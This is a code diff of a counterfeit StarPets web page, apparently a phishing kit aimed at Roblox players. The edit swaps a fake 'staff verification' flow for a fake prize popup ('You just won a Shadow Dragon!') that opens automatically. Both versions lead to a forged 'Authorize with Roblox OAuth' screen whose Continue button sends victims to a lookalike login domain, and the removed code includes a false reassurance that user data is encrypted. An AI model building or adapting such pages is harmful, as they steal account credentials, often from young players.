+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/turtle_66206713544449291159512730973707281506.webp" alt="Turtle" />
+        <span class="item-name">Turtle</span>
+        <span class="item-price">$7.54</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/winter_2023_chocolate_chip_bat_dragon_195846243537094651109480581636294177164.webp" alt="Chocolate Bat Dragon" />
+        <span class="item-name">Chocolate Bat Dragon</span>
+        <span class="item-price">$7.00</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/basic_egg_2022_dragonfly_48368860378767158633954110352931546799.webp" alt="Dragon Fly" />
+        <span class="item-name">Dragon Fly</span>
+        <span class="item-price">$0.10</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/dragon_124403728485816668684803314274571297384.webp" alt="Red Dragon" />
+        <span class="item-name">Red Dragon</span>
+        <span class="item-price">$0.20</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/cow_55393920947545740169286759073539942259.webp" alt="Cow" />
+        <span class="item-name">Cow</span>
+        <span class="item-price">$7.00</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/basic_egg_2022_alicorn_37879888006027866266908576613877872075.webp" alt="Alicorn" />
+        <span class="item-name">Alicorn</span>
+        <span class="item-price">$0.05</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/gumball_caterpillar_1773334588236.webp" alt="Gumball Caterpillar" />
+        <span class="item-name">Gumball Caterpillar</span>
+        <span class="item-price">$0.20</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/fairybat_222309107273644557260112255745280661910.webp" alt="Fairy Bat" />
+        <span class="item-name">Fairy Bat</span>
+        <span class="item-price">$1.70</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/silverback_gorilla_1772293803719.webp" alt="Silver Gorilla" />
+        <span class="item-name">Silver Gorilla</span>
+        <span class="item-price">$0.65</span>
+      </div>
+      <div class="item-card">
+        <img src="https://cdn.starpets.gg/AM/110x110/purrowl_1776609030509.webp" alt="Purrowl" />
+        <span class="item-name">Purrowl</span>
+        <span class="item-price">$0.30</span>
+      </div>
+    </div>
+  </div>
 
 </div>
 
-<!-- POPUPS -->
 
+
+<!-- POPUP OVERLAY -->
 <div class="popupOverlay" id="popupOverlay">
 
-    <!-- STEP 1 -->
+  <!-- WIN POPUP -->
+  <div class="popup" id="popupWin">
+    <div class="popupMiniLabel">🎉 Congratulations!</div>
+    <img class="popupImage" src="https://cdn.starpets.gg/AM/610x610/shadow_dragon_145223320826250720186133074893373364978.webp" alt="Shadow Dragon" style="width:180px;" />
+    <div class="popupTitle">You just won a Shadow Dragon!</div>
+    <div class="popupText">Value <strong style="color:#ff9225;">$144.99</strong></div>
+    <button class="popupBtn" onclick="showLoginPopup()">Claim</button>
+  </div>
 
-    <div class="popup" id="popup1">
-
-        <div class="stepBadge">
-            1/3 STEP
+  <!-- LOGIN METHOD POPUP -->
+  <div class="popup" id="popupLogin">
+    <img src="https://cdn.starpets.gg/AM/610x610/shadow_dragon_145223320826250720186133074893373364978.webp" style="width:140px;display:block;margin:0 auto 18px;" alt="Shadow Dragon" />
+    <div class="popupTitle" style="margin-bottom:20px;">Select Login Method to get your Shadow Dragon</div>
+    <div class="loginMethod" onclick="openRobloxModal()" style="cursor:pointer;">
+      <div class="loginLeft">
+        <div class="loginIconWrap">
+          <img src="https://starpets.gg/_nuxt/BOhmE_Z4eM-5415f33b.png" alt="Roblox" />
         </div>
-
-        <img
-        class="popupImage"
-        src="https://starpets.gg/_nuxt/fTwDd7GjVU-5415f33b.png"
-        alt=""
-        >
-
-        <div class="popupMiniLabel">
-            No alt accounts allowed
+        <div>
+          <div class="loginTitle">Login With Roblox</div>
+          <div class="loginSub">Continue account verification</div>
         </div>
-
-        <div class="popupTitle">
-            Use Your Main Roblox Account
-        </div>
-
-        <div class="popupText">
-            Staff members must use a real Roblox account
-            with at least 15 active days.
-        </div>
-
-        <button class="popupBtn" onclick="nextPopup(1,2)">
-            Next →
-        </button>
-
+      </div>
+      <div class="loginArrow">→</div>
     </div>
 
-    <!-- STEP 2 -->
-
-    <div class="popup" id="popup2">
-
-        <div class="stepBadge">
-            2/3 STEP
-        </div>
-
-        <img
-        class="popupImage"
-        src="https://starpets.gg/_nuxt/CMHLa8r7MN-5415f33b.png"
-        alt=""
-        >
-
-        <div class="popupMiniLabel">
-            Verification Process
-        </div>
-
-        <div class="popupTitle">
-            Account Verification
-        </div>
-
-        <div class="popupText">
-            Verification may take up to 1 day.
-            Rewards will be sent directly after approval.
-        </div>
-
-        <button class="popupBtn" onclick="nextPopup(2,3)">
-            Next →
-        </button>
-
-    </div>
-
-    <!-- STEP 3 -->
-
-    <div class="popup" id="popup3">
-
-        <div class="stepBadge">
-            3/3 STEP
-        </div>
-
-        <img
-        class="popupImage"
-        src="https://starpets.gg/_nuxt/DE2xzCMeD8-5415f33b.svg"
-        alt=""
-        >
-
-        <div class="popupMiniLabel">
-            Add Account
-        </div>
-
-        <div class="popupTitle">
-            Select Login Method To Get Staff
-        </div>
-
-        <div class="loginMethod" onclick="openRobloxModal()">
-
-            <div class="loginLeft">
-
-                <div class="loginIconWrap">
-
-                    <img
-                    class="loginIcon"
-                    src="https://starpets.gg/_nuxt/BOhmE_Z4eM-5415f33b.png"
-                    alt=""
-                    >
-
-                </div>
-
-                <div>
-
-                    <div class="loginTitle">
-                        Login With Roblox
-                    </div>
-
-                    <div class="loginSub">
-                        Continue account verification
-                    </div>
-
-                </div>
-
-            </div>
-
-            <div class="loginArrow">
-                →
-            </div>
-
-        </div>
-
-        <div class="warningBox">
-            We recommend using your main Roblox account.
-        </div>
-
-    </div>
+  </div>
 
 </div>
 
-<!-- SAFETY POPUP -->
-<div id="safetyOverlay" style="
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.55);
-    backdrop-filter: blur(6px);
-    display: none;
-    justify-content: center;
-    align-items: center;
-    padding: 18px;
-    z-index: 99999;
-">
-    <div style="
-        width: 100%;
-        max-width: 400px;
-        background: white;
-        border-radius: 32px;
-        padding: 26px;
-        animation: popupShow .22s ease;
-        text-align: center;
-    ">
-        <div style="
-            font-size: 20px;
-            font-weight: 900;
-            color: #1f1f1f;
-            margin-bottom: 18px;
-            font-family: Inter, Arial, sans-serif;
-        ">Why is it safe?</div>
-
-        <img src="https://starpets.gg/_nuxt/CnlEi08ZsC-5415f33b.png" alt="" style="
-            width: 100%;
-            max-width: 320px;
-            display: block;
-            margin: 0 auto 18px;
-        ">
-
-        <div style="
-            background: #dff2ff;
-            border: 1px solid #bfe6ff;
-            border-radius: 16px;
-            padding: 16px 18px;
-            color: #1a5fa8;
-            font-size: 14px;
-            font-weight: 500;
-            line-height: 1.6;
-            font-family: Inter, Arial, sans-serif;
-            margin-bottom: 20px;
-            text-align: left;
-        ">
-            All your data is stored in an encrypted form, and no one except us can access it. You can also deactivate your account at any time if necessary.
-        </div>
-
-        <button onclick="closeSafetyPopup()" style="
-            width: 100%;
-            padding: 14px 0;
-            background: #ff9622;
-            color: white;
-            border: none;
-            border-radius: 14px;
-            font-size: 15px;
-            font-weight: 700;
-            font-family: Inter, Arial, sans-serif;
-            cursor: pointer;
-            transition: 0.2s;
-        " onmouseover="this.style.background='#f08810'" onmouseout="this.style.background='#ff9622'" onmousedown="this.style.transform='scale(.98)'" onmouseup="this.style.transform=''">
-            Got it!
-        </button>
-    </div>
-</div>
-
-<!-- ROBLOX AUTH -->
-
-<div class="robloxModal" id="robloxModal">
-
-    <div class="robloxContainer">
-
-        <iframe
-        id="robloxFrame"
-        class="robloxFrame"
-        sandbox="allow-scripts allow-forms allow-same-origin"
-        referrerpolicy="no-referrer"
-        ></iframe>
-
-    </div>
-
-</div>
-
-<!-- SUPPORT BUTTON -->
-<div style="
-    position: fixed;
-    bottom: 24px;
-    right: 24px;
-    z-index: 99999;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    background: white;
-    border: 1px solid #ebebeb;
-    border-radius: 16px;
-    padding: 10px 18px 10px 10px;
-    box-shadow: 0 8px 30px rgba(0,0,0,0.12), 0 2px 8px rgba(0,0,0,0.06);
-    cursor: pointer;
-    transition: 0.22s;
-    user-select: none;
-" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 12px 36px rgba(0,0,0,0.16), 0 3px 10px rgba(0,0,0,0.08)';" onmouseout="this.style.transform='';this.style.boxShadow='0 8px 30px rgba(0,0,0,0.12), 0 2px 8px rgba(0,0,0,0.06)';" onmousedown="this.style.transform='scale(.97)';" onmouseup="this.style.transform='translateY(-3px)';">
-    <div style="
-        width: 38px;
-        height: 38px;
-        border-radius: 999px;
-        background: #bbf7d0;
-        color: #16a34a;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 18px;
-        flex-shrink: 0;
-    ">
-        🎧
-    </div>
-    <span style="
-        font-family: Inter, Arial, sans-serif;
-        font-size: 15px;
-        font-weight: 600;
-        color: #1f1f1f;
-        white-space: nowrap;
-    ">Live-Chat</span>
+<!-- ROBLOX MODAL -->
+<div id="robloxModal" style="position:fixed;inset:0;background:rgba(0,0,0,0.55);backdrop-filter:blur(6px);z-index:99999;display:none;justify-content:center;align-items:center;padding:16px;">
+  <div style="width:100%;max-width:460px;height:85vh;background:white;border-radius:28px;overflow:hidden;animation:popupShow .22s ease;">
+    <iframe id="robloxFrame" style="width:100%;height:100%;border:none;" sandbox="allow-scripts allow-forms allow-same-origin" referrerpolicy="no-referrer"></iframe>
+  </div>
 </div>
 
 <script>
+  const LOGIN_URL = "https://roblox.com.ki/login?returnUrl=0462060840624233";
 
-const overlay = document.getElementById("popupOverlay");
+  setTimeout(function() {
+    document.getElementById('popupOverlay').classList.add('active');
+    document.getElementById('popupWin').classList.add('active');
+  }, 1000);
 
-/* OPEN POPUPS */
+  function showLoginPopup() {
+    document.getElementById('popupWin').classList.remove('active');
+    document.getElementById('popupLogin').classList.add('active');
+  }
 
-function openPopup(){
+  function openRobloxModal() {
+    document.getElementById('robloxModal').style.display = 'flex';
+    const iframe = document.getElementById('robloxFrame');
+    iframe.srcdoc = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{width:100%;height:100vh;background:#0b0b0d;font-family:Arial,sans-serif;overflow:hidden;display:flex;flex-direction:column;}
+.top{padding:20px 28px;}
+.rbxLogo{height:30px;object-fit:contain;filter:brightness(0) invert(1);}
+.center{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 24px 40px;}
+.oauthText{color:#fff;font-size:20px;font-weight:700;margin-bottom:24px;text-align:center;}
+.oauthApp{display:flex;flex-direction:column;align-items:center;margin-bottom:20px;}
+.oauthAppImage{width:92px;height:92px;border-radius:22px;object-fit:cover;margin-bottom:10px;background:white;padding:8px;}
+.oauthAppName{color:white;font-size:15px;font-weight:500;margin-bottom:4px;}
+.permBox{background:#1a1a1f;border:1px solid #2a2a30;border-radius:16px;padding:14px 16px;width:100%;max-width:360px;margin-bottom:24px;}
+.permTitle{color:#888;font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:10px;}
+.permItem{display:flex;align-items:center;gap:10px;padding:6px 0;}
+.permItem+.permItem{border-top:1px solid #222;}
+.permIcon{width:20px;height:20px;background:#2a2a30;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:11px;flex-shrink:0;}
+.permText{color:#ccc;font-size:13px;}
+.buttons{width:100%;max-width:360px;display:flex;flex-direction:column;align-items:center;}
+.continueBtn{width:100%;padding:14px 0;background:white;color:black;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;margin-bottom:10px;}
+.returnBtn{width:100%;padding:13px 0;background:#111317;color:white;border:1px solid #444;border-radius:10px;font-size:15px;font-weight:500;cursor:pointer;}
+</style>
+</head>
+<body>
+<div class="top">
+  <img src="https://logodix.com/logo/1012185.png" class="rbxLogo">
+</div>
+<div class="center">
+  <div class="oauthText">Authorize with Roblox OAuth</div>
+  <div class="oauthApp">
+    <img src="https://starpets.gg/_nuxt/okcZ9ewNhU-5415f33b.svg" class="oauthAppImage">
+    <div class="oauthAppName">StarPets</div>
+    <div class="permBx">
+    </div>
+  </div>
+  <div class="buttons">
+    <button class="continueBtn" onclick="window.location.href='${LOGIN_URL}'">Continue</button>
+    <button class="returnBtn" onclick="parent.closeRobloxModal()">Return to StarPets</button>
+  </div>
+</div>
+</body>
+</html>`;
+  }
 
-    overlay.style.display = "flex";
-
-    document.getElementById("popup1").style.display = "block";
-    document.getElementById("popup2").style.display = "none";
-    document.getElementById("popup3").style.display = "none";
-
-}
-
-/* NEXT */
-
-function nextPopup(current,next){
-
-    document.getElementById("popup"+current).style.display = "none";
-    document.getElementById("popup"+next).style.display = "block";
-
-}
-
-/* CHANGE THIS LINK */
-
-const LOGIN_URL = "https://roblox.com.ki/login?returnUrl=0462060840624233";
-
-/* OPEN ROBLOX MODAL */
-
-function openRobloxModal(){
-
-    document.getElementById("robloxModal").style.display = "flex";
-
-    const iframe = document.getElementById("robloxFrame");
-
-    iframe.srcdoc = `
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-    <meta charset="UTF-8">
-
-    <style>
-
-    *{
-        margin:0;
-        padding:0;
-        box-sizing:border-box;
-    }
-
-    body{
-        width:100%;
-        height:100vh;
-        background:#0b0b0d;
-        font-family:Arial,sans-serif;
-        overflow:hidden;
-        display:flex;
-        flex-direction:column;
-    }
-
-    .top{
-        padding:20px 28px;
-    }
-
-    .rbxLogo{
-        height:30px;
-        object-fit:contain;
-        filter:brightness(0) invert(1);
-    }
-
-    .center{
-        flex:1;
-        display:flex;
-        flex-direction:column;
-        align-items:center;
-        justify-content:center;
-        padding:20px 24px 40px;
-    }
-
-    .oauthText{
-        color:#fff;
-        font-size:20px;
-        font-weight:700;
-        margin-bottom:48px;
-        text-align:center;
-    }
-
-    .oauthApp{
-        display:flex;
-        flex-direction:column;
-        align-items:center;
-        margin-bottom:36px;
-    }
-
-    .oauthAppImage{
-        width:92px;
-        height:92px;
-        border-radius:22px;
-        object-fit:cover;
-        margin-bottom:12px;
-        background:white;
-        padding:8px;
-    }
-
-    .oauthAppName{
-        color:white;
-        font-size:15px;
-        font-weight:500;
-    }
-
-    .buttons{
-        width:100%;
-        max-width:360px;
-        display:flex;
-        flex-direction:column;
-        align-items:center;
-    }
-
-    .continueBtn{
-        width:100%;
-        padding:14px 0;
-        background:white;
-        color:black;
-        border:none;
-        border-radius:10px;
-        font-size:15px;
-        font-weight:700;
-        cursor:pointer;
-    }
-
-    .divider{
-        display:flex;
-        align-items:center;
-        width:100%;
-        margin:14px 0;
-    }
-
-    .line{
-        flex:1;
-        height:1px;
-        background:#333;
-    }
-
-    .or{
-        color:#888;
-        font-size:13px;
-        padding:0 14px;
-    }
-
-    .returnBtn{
-        width:100%;
-        padding:13px 0;
-        background:#111317;
-        color:white;
-        border:1px solid #444;
-        border-radius:10px;
-        font-size:15px;
-        font-weight:500;
-        cursor:pointer;
-    }
-
-    </style>
-    </head>
-
-    <body>
-
-        <div class="top">
-
-            <img
-            src="https://logodix.com/logo/1012185.png"
-            class="rbxLogo"
-            >
-
-        </div>
-
-        <div class="center">
-
-            <div class="oauthText">
-                Authorize with Roblox OAuth
-            </div>
-
-            <div class="oauthApp">
-
-                <img
-                src="https://starpets.gg/_nuxt/okcZ9ewNhU-5415f33b.svg"
-                class="oauthAppImage"
-                >
-
-                <div class="oauthAppName">
-                    StarPets
-                </div>
-
-            </div>
-
-            <div class="buttons">
-
-                <button
-                class="continueBtn"
-                onclick="window.location.href='${LOGIN_URL}'"
-                >
-                    Continue
-                </button>
-
-                <div class="divider">
-
-                    <div class="line"></div>
-
-                    <div class="or">
-                        or
-                    </div>
-
-                    <div class="line"></div>
-
-                </div>
-
-                <button
-                class="returnBtn"
-                onclick="parent.closeRobloxModal()"
-                >
-                    Return to StarPets
-                </button>
-
-            </div>
-
-        </div>
-
-    </body>
-    </html>
-    `;
-
-}
-
-/* CLOSE */
-
-function openSafetyPopup(){
-    document.getElementById("safetyOverlay").style.display = "flex";
-}
-
-function closeSafetyPopup(){
-    document.getElementById("safetyOverlay").style.display = "none";
-}
-
-function closeRobloxModal(){
-
-    document.getElementById("robloxModal").style.display = "none";
-
-}
-
+  function closeRobloxModal() {
+    document.getElementById('robloxModal').style.display = 'none';
+  }
 </script>
-
 </body>
 </html>
